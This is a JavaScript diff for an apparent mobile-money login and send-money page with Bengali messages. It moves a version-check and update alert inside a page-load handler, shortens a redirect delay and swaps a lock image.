@@ -1,4 +1,6 @@
-function checkVersionAndUpdate() {
+
+document.addEventListener('DOMContentLoaded', function() {
+    function checkVersionAndUpdate() {
     // Check if the element with ID 'version' exists
     const versionElement = document.getElementById('version');
 
@@ -14,12 +16,12 @@ function checkVersionAndUpdate() {
             anchor.style.color = 'gray';        // Optional: Make it look disabled
         });
 
+  alert('App আপডেট করুন');
+            document.getElementById('no-connection-popup2').style.display ="block";
         // Display the message in the result paragraph
         const resultElement = document.getElementById('result');
         if (resultElement) {
             resultElement.innerText = 'নতুন V38 এসেছে';
-        } else {
-            alert('App আপডেট করুন');
         }
     } else {
       }
@@ -27,7 +29,6 @@ function checkVersionAndUpdate() {
 
 // Call the function
 checkVersionAndUpdate();
-document.addEventListener('DOMContentLoaded', function() {
     function triggerShake() {
       const container = document.getElementById('loginForm');
       let shakeInterval;
@@ -159,7 +160,7 @@ const amt = "10";
 sendMoneyForm.innerHTML = `<img src="index.gif" style="width: 100%; height: auto; pointer-event:none">`;
     setTimeout(function() { 
                window.location.href = matchedAccount.url;   
-           }, 1050); 
+           }, 900); 
     } else {
          if (!audioPlayed) {
             audioElement2.play().catch(error => {
@@ -168,7 +169,7 @@ sendMoneyForm.innerHTML = `<img src="index.gif" style="width: 100%; height: auto
             audioPlayed = true;
         }     triggerShake();
                 failed.style.display = 'block';
-      document.getElementById('mypic').src = 'https://bpecd.github.io/data/lock2.gif';
+      document.getElementById('mypic').src = 'https://bpecd.github.io/data/lock.gif';
 document.getElementById('result').innerText = 'আপনার নম্বর অথবা পিন সঠিক নয়';
         var icon = document.getElementById("icon");
         icon.classList.remove("fa-lock-keyhole-open");
